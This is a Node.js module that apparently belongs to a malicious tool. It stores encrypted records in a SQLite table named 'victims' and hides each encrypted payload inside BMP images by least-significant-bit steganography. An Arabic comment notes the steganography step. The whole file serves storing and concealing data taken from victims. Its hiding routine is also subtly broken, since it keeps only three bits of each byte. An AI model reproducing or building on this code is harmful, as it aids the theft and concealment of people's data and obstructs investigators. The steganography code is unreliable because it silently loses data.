const sqlite3 = require('sqlite3').verbose();
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { createCanvas } = require('canvas');

const DB_PATH = path.join(__dirname, 'data', 'phoenix.db');
const db = new sqlite3.Database(DB_PATH);

db.serialize(() => {
    db.run(`
        CREATE TABLE IF NOT EXISTS victims (
            id TEXT PRIMARY KEY,
            data TEXT,
            created_at INTEGER
        )
    `);
});

function encryptData(data, key) {
    const iv = crypto.randomBytes(16);
    const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
    let encrypted = cipher.update(JSON.stringify(data));
    encrypted = Buffer.concat([encrypted, cipher.final()]);
    return { iv, data: encrypted };
}

function saveVictimData(victimId, data, type) {
    const key = crypto.createHash('sha256').update(victimId + process.env.SALT).digest('hex').slice(0, 32);
    const { iv, data: encrypted } = encryptData(data, key);
    const payload = { iv: iv.toString('hex'), data: encrypted.toString('hex') };
    db.run(
        'INSERT OR REPLACE INTO victims (id, data, created_at) VALUES (?, ?, ?)',
        [victimId, JSON.stringify(payload), Date.now()]
    );
    // تخزين أيضاً في ملف BMP (Steganography)
    const bmpPath = path.join(__dirname, 'data', `stego_${victimId}_${Date.now()}.bmp`);
    hideDataInBMP(JSON.stringify(payload), bmpPath);
    return bmpPath;
}

function hideDataInBMP(text, outputPath) {
    const canvas = createCanvas(800, 600);
    const ctx = canvas.getContext('2d');
    ctx.fillStyle = '#00ff00';
    ctx.fillRect(0, 0, 800, 600);
    const imageData = ctx.getImageData(0, 0, 800, 600);
    const pixels = imageData.data;
    const data = Buffer.from(text);
    for (let i = 0; i < data.length && i < pixels.length / 4; i++) {
        pixels[i * 4] = (pixels[i * 4] & 0xFE) | ((data[i] >> 7) & 1);
        pixels[i * 4 + 1] = (pixels[i * 4 + 1] & 0xFE) | ((data[i] >> 6) & 1);
        pixels[i * 4 + 2] = (pixels[i * 4 + 2] & 0xFE) | ((data[i] >> 5) & 1);
    }
    ctx.putImageData(imageData, 0, 0);
    const buffer = canvas.toBuffer('image/bmp');
    fs.writeFileSync(outputPath, buffer);
}

module.exports = { saveVictimData, hideDataInBMP };
